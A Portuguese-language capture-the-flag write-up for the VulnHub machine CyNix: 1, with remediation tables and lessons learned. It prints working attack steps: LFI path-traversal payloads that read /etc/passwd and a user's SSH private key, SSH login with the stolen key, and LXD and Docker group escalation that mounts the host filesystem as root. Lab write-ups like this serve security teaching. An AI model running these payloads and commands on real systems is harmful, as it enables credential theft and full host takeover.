# CyNix: 1 — Writeup (PT-BR)

> O formulário está ali na página. Você só não consegue ver porque o desenvolvedor colocou `opacity: 0`. ( ͡° ͜ʖ ͡°)
>
> CyNix: 1 ensina uma lição que todo desenvolvedor web deveria saber de cor: controles do lado do cliente não são controles de segurança. Uma vez que você enxerga através do formulário invisível, todo o resto cai como dominós. O LFI rouba uma chave SSH, e então uma única associação de grupo entrega o host inteiro. ¯\_(ツ)_/¯

---

| Campo | Valor |
|-------|-------|
| **Level** | Médio |
| **VM Alvo** | CyNix: 1 (Linux) |
| **VM Atacante** | Kali Linux 2023+ |
| **VulnHub URL** | https://www.vulnhub.com/entry/cynix-1 |
| **Técnicas** | Brute-force de diretório, bypass CSS client-side, Local File Inclusion (LFI) via path traversal, exfiltração de chave privada SSH, escalação de privilégio via grupo LXD |
| **CVEs** | Nenhum CVE específico. A escalação de privilégio via grupo LXD é uma configuração incorreta de design (documentada em relatórios do HackerOne e advisories de segurança Linux). O LFI é uma vulnerabilidade de classe sem CVE específico atribuído a esta versão. |
| **Grupos APT** | APT33 (usa LFI para roubo de credenciais e chaves de servidores Linux), FIN8 (LFI em aplicações web de ambientes financeiros/hospitalidade), atores genéricos capazes de escape de container |

---

## Resumo do Ataque

```
[nmap] portas 80 (HTTP), 6688 (SSH)
    |
    v
[DirBuster] encontra /lavalamp
    |
    v
[/lavalamp/canyoubypassme.php] formulário oculto (opacity: 0) -> parâmetro POST file=
    |
    v
[DevTools do Browser] alterar opacity para 1 -> formulário visível
    |
    v
[Burp Suite Repeater] file=../../../etc/passwd -> LFI confirmado
    |
    v
[LFI] file=../../../home/ford/.ssh/id_rsa -> chave privada SSH extraída
    |
    v
[ssh -i key -p 6688 ford@ALVO] acesso inicial
    |
    v
[id] ford está no grupo lxd
    |
    v
[lxd-alpine-builder] criar imagem Alpine -> importar -> container privilegiado
    |
    v
[lxc config device add] montar / do host em /mnt/root
    |
    v
[lxc exec ignite /bin/sh] root dentro do container -> /mnt/root/root/flag.txt
```

---

## Metodologia

1. Descoberta de host e scan de portas (netdiscover + nmap)
2. Brute-force de diretório web (DirBuster)
3. Bypass CSS client-side via ferramentas do desenvolvedor do browser
4. Exploração de LFI via path traversal no parâmetro POST `file`
5. Extração de chave privada SSH via LFI
6. Acesso inicial via SSH com chave extraída (porta não padrão 6688)
7. Escalação de privilégio via grupo LXD com container privilegiado

---

## Passo 1: Descoberta de Host e Scan de Portas

```bash
netdiscover -r 192.168.1.0/24
export TARGET=192.168.1.105
nmap -p- -A $TARGET
```

Resultados esperados:

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd
6688/tcp open  ssh     OpenSSH
```

Dois serviços: HTTP na porta padrão, SSH na porta não padrão 6688. A porta SSH não padrão é um detalhe importante: tentar a porta 22 mais tarde vai falhar.

> **TTP MITRE:** T1595.002 — Active Scanning: Vulnerability Scanning

> **Relevância no mundo real:** Esconder o SSH em uma porta não padrão é segurança por obscuridade. Reduz o ruído em scans automatizados mas não oferece proteção real quando um atacante executa um scan completo de portas. O APT33 rotineiramente varre todos os intervalos de porta em seus alvos.

> **Alternativa:** `nmap -sV --top-ports 10000 $TARGET` cobre a vasta maioria das portas não padrão usadas em implantações reais.

---

## Passo 2: Enumeração Web

A raiz web retorna a página padrão do Apache. Execute o DirBuster para descobrir caminhos ocultos:

```bash
dirb http://$TARGET /usr/share/dirb/wordlists/common.txt
```

O DirBuster encontra `/lavalamp`. Navegar até `http://$TARGET/lavalamp/` revela um formulário de contato que faz POST para `canyoubypassme.php`.

Visite `http://$TARGET/lavalamp/canyoubypassme.php` diretamente. A página mostra apenas uma imagem. Inspecione o código-fonte (Ctrl+U):

```html
<form action="" method="POST" style="opacity:0">
  <input type="text" name="file" value="1">
  <input type="submit" value="Submit">
</form>
```

Aí está. O formulário inteiro está oculto com `style="opacity:0"`. O nome do parâmetro é `file`, e atualmente envia o valor `1`. ( ͡° ͜ʖ ͡°)

> **TTP MITRE:** T1083 — File and Directory Discovery; T1190 — Exploit Public-Facing Application

---

## Passo 3: Expor o Formulário Oculto e Confirmar LFI

Abra as ferramentas do desenvolvedor do browser (F12), encontre o elemento de formulário com `opacity:0` e altere o valor para `1`. Submeta o formulário com o valor `1` para capturar a requisição no Burp Suite Proxy.

Encaminhe a requisição para o Burp Repeater e teste path traversal LFI:

```
POST /lavalamp/canyoubypassme.php HTTP/1.1
Host: 192.168.1.105
Content-Type: application/x-www-form-urlencoded

file=../../../etc/passwd
```

A resposta retorna o conteúdo de `/etc/passwd`. LFI confirmado. Bingo!! ( ˘ ³˘)♥

Da saída do `/etc/passwd`, identifique os usuários interessantes. Procure por `ford` com um diretório home e indício de grupo lxd na lista de usuários.

> **TTP MITRE:** T1005 — Data from Local System (via LFI)

> **Relevância no mundo real:** Vulnerabilidades LFI que podem percorrer para caminhos arbitrários são classificadas como Críticas quando material de autenticação é acessível. Um único LFI de um endpoint web público para uma chave SSH privada é um caminho direto de zero credenciais para acesso shell. APT33 e FIN8 foram documentados usando LFI para ler `/etc/passwd`, `/etc/shadow` e arquivos de chave privada.

> **Alternativa:** Se o Burp não estiver disponível, o `curl` funciona igualmente bem: `curl -s -X POST http://$TARGET/lavalamp/canyoubypassme.php -d "file=../../../etc/passwd"`

---

## Passo 4: Extração de Chave SSH Privada via LFI

Com o diretório home de `ford` estabelecido a partir do `/etc/passwd`, leia a chave SSH privada:

```
POST /lavalamp/canyoubypassme.php

file=../../../home/ford/.ssh/id_rsa
```

Copie o conteúdo da chave retornada. Vai parecer com:

```
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA...
-----END RSA PRIVATE KEY-----
```

Cole em um arquivo local:

```bash
nano key   # cole o conteúdo da chave
chmod 600 key
```

As permissões no arquivo de chave devem ser 600 ou o SSH vai recusar utilizá-lo.

> **TTP MITRE:** T1552.004 — Credentials in Files: Private Keys

> **Relevância no mundo real:** Arquivos de chave SSH privada armazenados em locais legíveis pelo processo do servidor web são uma configuração crítica errada. O servidor web (Apache/nginx) roda como `www-data` ou similar. Se esse processo pode ler `/home/ford/.ssh/id_rsa`, significa que as permissões do arquivo estão muito permissivas. Esse padrão exato apareceu em incidentes reais onde LFI em aplicação web levou diretamente à tomada do SSH.

---

## Passo 5: Acesso Inicial via SSH

Use a chave extraída para fazer login como `ford` na porta SSH não padrão:

```bash
ssh -i key -p 6688 ford@$TARGET
```

Saída esperada:

```
ford@cynix:~$
```

Leia a flag de usuário:

```bash
cat ~/user.txt
```

Verifique a associação ao grupo:

```bash
id
# uid=1001(ford) gid=1001(ford) groups=1001(ford),116(lxd)
```

O grupo `lxd` está presente. Esse é o caminho de escalação. ( ͡° ͜ʖ ͡°)

> **TTP MITRE:** T1078 — Valid Accounts; T1021.004 — Remote Services: SSH

---

## Passo 6: Escalação de Privilégio via Grupo LXD

A associação ao grupo `lxd` concede a capacidade de criar e gerenciar containers LXD com privilégios completos, incluindo montar o sistema de arquivos do host. Isso é efetivamente acesso equivalente a root.

### Na máquina atacante: construir a imagem Alpine

```bash
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine
# produz: alpine-v3.10-x86_64-20191008_1227.tar.gz
python3 -m http.server 8000
```

### Na máquina alvo (como ford): importar e configurar o container

```bash
cd /tmp
wget http://192.168.1.107:8000/alpine-v3.10-x86_64-20191008_1227.tar.gz
lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myimage
lxc image list
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
```

### Dentro do container

```bash
id
# uid=0(root) gid=0(root)
cat /mnt/root/root/flag.txt
```

O sistema de arquivos do host está montado em `/mnt/root`. Você tem acesso de leitura irrestrito ao host inteiro como root dentro do container. ᕕ( ᐛ )ᕗ

> **TTP MITRE:** T1611 — Escape to Host; T1548 — Abuse Elevation Control Mechanism

> **Relevância no mundo real:** Adicionar um usuário ao grupo `lxd` é equivalente a dar a ele `sudo` irrestrito. Runtimes de container com acesso privilegiado ao sistema de arquivos do host foram explorados em incidentes reais. Provedores de nuvem e benchmarks de segurança de container (CIS, NIST) explicitamente sinalizam associação aos grupos `lxd` e `docker` como uma configuração crítica incorreta.

> **Alternativa:** Se o LXD ainda não estiver inicializado, execute `lxd init` primeiro (aceite todos os padrões). O ataque também funciona com associação ao grupo Docker usando o equivalente `docker run -v /:/mnt/root -it alpine chroot /mnt/root`.

---

## Flags / Hashes / Credenciais Capturadas

| Item | Valor |
|------|-------|
| Flag de usuário | `~/user.txt` (capturada como ford) |
| Flag root | `/mnt/root/root/flag.txt` (via container LXD privilegiado) |
| Chave SSH privada | Extraída via LFI de `/home/ford/.ssh/id_rsa` |
| Usuário SSH | `ford`, porta 6688 |
| Grupo LXD | `ford` (116/lxd) |

---

## Lições Aprendidas

1. **Controles de visibilidade do lado do cliente (CSS opacity, `display:none`, atributo `hidden`) não são controles de segurança.** Qualquer atacante pode modificar propriedades do DOM com as ferramentas do desenvolvedor do browser ou contorná-las completamente com `curl`. Segurança pertence ao lado do servidor.

2. **Vulnerabilidades LFI que podem ler arquivos arbitrários são de severidade Crítica quando material de autenticação é acessível.** Um único LFI de um endpoint web público para uma chave SSH privada é um caminho direto de zero credenciais para acesso shell.

3. **Associação aos grupos `lxd` ou `docker` é equivalente a acesso root no host.** Associações de grupo devem ser auditadas com o mesmo rigor que entradas do sudoers.

4. **Chaves SSH privadas armazenadas em diretórios home são acessíveis a qualquer processo que possa ler esse caminho.** Processos do servidor web nunca devem ter acesso a diretórios home de usuários contendo material de chave.

5. **Portas não padrão não fornecem segurança.** Um scan completo `nmap -p-` as encontra em segundos.

**Relevância no Mundo Real:** A cadeia LFI para chave SSH é usada em intrusões reais. A escalação de privilégio via grupo LXD foi documentada em incidentes reais envolvendo provedores de hospedagem gerenciada onde clientes foram adicionados ao grupo `lxd` durante a configuração do servidor e nunca foram removidos.

---

## Mapeamento MITRE ATT&CK

| Tática | Técnica | ID | Ferramenta |
|--------|---------|-----|------------|
| Reconhecimento | Active Scanning: Vulnerability Scanning | T1595.002 | nmap |
| Descoberta | File and Directory Discovery | T1083 | dirb |
| Acesso Inicial | Exploit Public-Facing Application | T1190 | Burp Suite / curl |
| Acesso a Credenciais | Credentials in Files: Private Keys | T1552.004 | LFI |
| Acesso a Credenciais | Data from Local System | T1005 | LFI path traversal |
| Acesso Inicial | Valid Accounts | T1078 | SSH |
| Movimentação Lateral | Remote Services: SSH | T1021.004 | ssh -i key -p 6688 |
| Escalação de Privilégio | Escape to Host | T1611 | lxc exec |
| Escalação de Privilégio | Abuse Elevation Control Mechanism | T1548 | grupo lxd |
| Comando e Controle | Ingress Tool Transfer | T1105 | python3 http.server |

---

## Remediação

### NIST CSF 2.0

| Função | Controle | Ação |
|--------|----------|------|
| Identificar (ID.AM) | Inventário de ativos | Auditar todas as associações de grupo; sinalizar membros dos grupos lxd/docker |
| Proteger (PR.AC) | Gerenciamento de identidade | Remover ford do grupo lxd; aplicar política de grupo com menor privilégio |
| Proteger (PR.DS) | Segurança de dados | Restringir permissões de arquivos de chave SSH ao usuário proprietário (mode 600) |
| Proteger (PR.IP) | Proteção de informação | Mover parâmetro `file` vulnerável ao LFI para validação de entrada com whitelist |
| Detectar (DE.CM) | Monitoramento | Alertar sobre eventos `lxc exec` e `lxc config device add` via auditd |

### NIST SP 800-53 Rev. 5

| Controle | Descrição |
|---------|-----------|
| AC-6 | Menor Privilégio: remover usuários dos grupos lxd e docker a menos que estritamente necessário |
| AC-3 | Aplicação de Acesso: aplicar autenticação do lado do servidor para todas as submissões de formulário |
| SI-10 | Validação de Entrada de Informação: colocar em whitelist os caminhos de arquivo permitidos no parâmetro `file` |
| SC-28 | Proteção de Informação em Repouso: garantir que arquivos de chave privada não sejam legíveis pelos processos do servidor web |
| AU-12 | Geração de Registros de Auditoria: habilitar regras auditd para operações de container e acesso a arquivos em diretórios home |

### CISA KEV

Nenhum CVE desta box aparece no catálogo CISA KEV. A escalação via grupo LXD é uma configuração incorreta, não uma vulnerabilidade com patch. As organizações devem tratar auditorias de associação de grupo como um controle compensatório.

### C2M2 (Cybersecurity Capability Maturity Model)

| Domínio | Prática | Lacuna |
|---------|---------|--------|
| Identity and Access Management (IAM) | MIL-2 | Associação ao grupo lxd não tratada como acesso privilegiado |
| Asset, Change, and Configuration Management (ASSET) | MIL-1 | Sem processo de revisão de configuração para tratamento de entrada em aplicações web |
| Threat and Vulnerability Management (THREAT) | MIL-1 | LFI na aplicação web não detectado nem remediado |

### MITRE D3FEND

| Técnica D3FEND | ID | Endereça |
|----------------|----|----------|
| Application Configuration Hardening | D3-ACH | Desabilitar traversal de diretório; validar entrada de arquivo no lado do servidor |
| Credential Hardening | D3-CH | Restringir permissões de chaves SSH; mover chaves para fora de caminhos acessíveis pela web |
| User Account Permissions | D3-UAP | Remover grupo lxd de usuários não administradores |
| File System Access Pattern Analysis | D3-FSAPA | Monitorar acesso a diretórios /home por processos do servidor web |
| Container Workload Security | D3-CWS | Aplicar containers não privilegiados; auditar criação de containers privilegiados |

---

## Considerações Finais

CyNix: 1 é um belo exemplo de como um único erro de design (formulário com `opacity:0`) combinado com outro erro de design (passar entrada do usuário diretamente para um caminho de arquivo) e uma única configuração incorreta (associação ao grupo lxd) encadeia em um comprometimento completo do sistema.

Cada passo aqui é realista. LFI para chave SSH é um padrão de ataque documentado. Grupo LXD para root é uma configuração incorreta documentada com múltiplos relatórios reais.

Obrigado ao autor de CyNix por uma box limpa e focada que ensina fundamentos sem ruído desnecessário.

Thanks guys!! (❍ᴥ❍ʋ)
